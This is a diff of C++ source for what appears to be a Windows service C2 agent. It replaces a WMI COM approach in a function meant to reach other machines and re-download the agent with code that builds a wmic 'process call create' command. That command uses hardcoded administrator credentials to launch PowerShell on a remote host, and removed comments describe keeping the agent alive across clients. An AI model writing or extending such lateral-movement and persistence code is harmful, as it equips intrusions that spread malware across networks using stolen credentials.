@@ -4,10 +4,7 @@
 #include <winsock2.h>
 #include <process.h>
 #include <ws2tcpip.h>
-#include <comdef.h>
-#include <Wbemidl.h>
 #pragma comment(lib,"ws2_32.lib")
-#pragma comment(lib, "wbemuuid.lib")
 #define _CRT_SECURE_NO_WARNINGS
 
 SERVICE_STATUS ServiceStatus;
@@ -49,104 +46,36 @@ static void encrypt(char* plainText) {
 }
 
 unsigned __stdcall winrmOtherClients(){
-    // TODO params, pointer to struct that contains ips, usernames and passwords
-    // TODO figure out how to make sure that only one thread has access to the struct at a time
-    // This function will attempt to connect to other clients via WinRM. It will check if the clinet has an active connection to the C2.
-    // If it doesn't, it will redownload the agent
-
-    // result of attempting to make WinRM connection
-    HRESULT hres;
-
-    // Initialize COM.
-    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
-    if (FAILED(hres)) {
-        printf("Failed to initialize COM library. Error code = 0x%x", hres);
-    }
-
-    // Set general COM security levels.
-    hres = CoInitializeSecurity(
-        NULL,
-        -1,                          // COM authentication
-        NULL,                        // Authentication services
-        NULL,                        // Reserved
-        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
-        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
-        NULL,                        // Authentication info
-        EOAC_NONE,                   // Additional capabilities 
-        NULL                         // Reserved
-    );
-
-    if (FAILED(hres)) {
-        printf("Failed to initialize security. Error code = 0x%x", hres);
-        CoUninitialize();
-    }
-
-    // Obtain the initial locator to WMI.
-    IWbemLocator* pLoc = NULL;
-    hres = CoCreateInstance(
-        CLSID_WbemLocator,
-        0,
-        CLSCTX_INPROC_SERVER,
-        IID_IWbemLocator, (LPVOID*)&pLoc);
-
-    if (FAILED(hres)) {
-        printf("Failed to create IWbemLocator object. Error code = 0x%x", hres);
-        CoUninitialize();
-        return 1;  // Program has failed.
-    }
-
     // Allocate memory for client
     otherClient* client1 = (otherClient*)calloc(1, sizeof(struct otherClient));
     strcpy_s(client1->ip, rsize_t(19), "10.0.10.81");
     strcpy_s(client1->username, rsize_t(29), "administrator");
     strcpy_s(client1->password, rsize_t(29), "Password-123456");
 
-    // TODO
-    // While(true){
-    //      sleep(some time)
-    //      for client in clients{
-    //           wmi commands to make sure that this machine has an agent running
+    const char* powershellCommand = "New-Item -ItemType file -Path C:\\wmitest.txt";
 
-    // Connect to the WMI namespace.
-    IWbemServices* pSvc = NULL;
+    // Create command to execute WMIC and run a PowerShell command to get processes
+    char* Command = (char*)calloc(500, sizeof(char));
+    strcat_s(Command, 500, "wmic /node:");
+    strcat_s(Command, 500, client1->ip);
+    strcat_s(Command, 500, " /user:");
+    strcat_s(Command, 500, client1->username);
+    strcat_s(Command, 500, " /password:");
+    strcat_s(Command, 500, client1->password);
+    strcat_s(Command, 500, " process call create \"powershell.exe -Command \\\"");
+    strcat_s(Command, 500, powershellCommand);
+    strcat_s(Command, 500, "\\\"\"");
 
-    // Create the full wmi namespace path with the ip address
-    char* path = (char*)calloc(40, sizeof(char));
-    strcpy_s(path, 40, "\\\\");
-    strcat_s(path, 36, client1->ip);
-    strcat_s(path, 20, "\\ROOT\\CIMV2");
+    // Execute the command
+    int result = system(Command);
 
-    BSTR namespacePath = SysAllocString((wchar_t*)path);
-
-    hres = pLoc->ConnectServer(
-        _bstr_t(namespacePath),     // WMI namespace
-        _bstr_t(client1->username), // User name
-        _bstr_t(client1->password), // User password
-        0,                          // Locale
-        NULL,                       // Security flags
-        0,                          // Authority 
-        0,                          // Context object 
-        &pSvc                       // IWbemServices proxy
-    );
-
-    if (FAILED(hres)) {
-        printf("Could not connect. Error code = 0x%x", hres);
-        pLoc->Release();
-        CoUninitialize();
-        return 1;  // Program has failed.
+    // Check the result
+    if (result == -1) {
+        perror("System command failed");
+        return 1;
     }
 
-    printf("Connected to ROOT\\CIMV2 WMI namespace\n");
-
-    // Perform necessary operations (e.g., executing a command)...
-    // Make multiple WMI requests using pSvc. 
-    // Example:
-    // HRESULT queryResult = pSvc->ExecQuery(...);
-    // 
-    // Cleanup
-    pSvc->Release();
-    pLoc->Release();
-    CoUninitialize();
+    printf("Command executed successfully\n");
 }
 
 unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
